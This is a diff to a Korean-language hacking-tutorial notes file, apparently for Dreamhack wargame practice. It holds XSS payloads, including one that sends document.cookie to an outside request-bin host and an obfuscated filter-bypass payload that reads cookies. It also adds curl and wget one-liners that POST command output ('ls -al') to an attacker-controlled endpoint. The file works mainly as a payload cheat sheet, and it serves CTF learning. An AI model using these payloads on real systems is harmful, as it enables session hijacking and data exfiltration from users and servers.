@@ -1,6 +1,5 @@
-# hacking-tutorial
 
-## XSS
+# XSS (Cross Site Scripting)
 
 쿠키 및 세션 탈취 공격 코드
 ```js
@@ -45,7 +44,7 @@ window.open("http://hacker.dreamhack.io/")
 임의의 이용자가 내 페이지에 접속하면서, cookie를 남기게 한다.
 https://tools.dreamhack.games/
 ```js
-<script>location.href = "http://wnudhpp.request.dreamhack.games/?memo=" + document.cookie;</script>
+<script>location.href = "http://unlekhg.request.dreamhack.games/?memo=" + document.cookie;</script>
 ```
 
 #### 필터링 우회
@@ -110,3 +109,12 @@ function XSSFilter(data){
 location=/javascript:/.source + /alert/.source + [URL+0][0][12] + /document.cookie/.source + [URL+0][0][13];
 ```
 
+# Curl / wget
+
+Post JSON
+```
+curl https://qpcjopq.request.dreamhack.games -d "$(ls -al)"
+
+wget 	https://qpcjopq.request.dreamhack.games --method=POST --body-data="`ls -al`"
+```
+https://gchq.github.io/CyberChef/ 에서 URL Encode하여 사용한다.
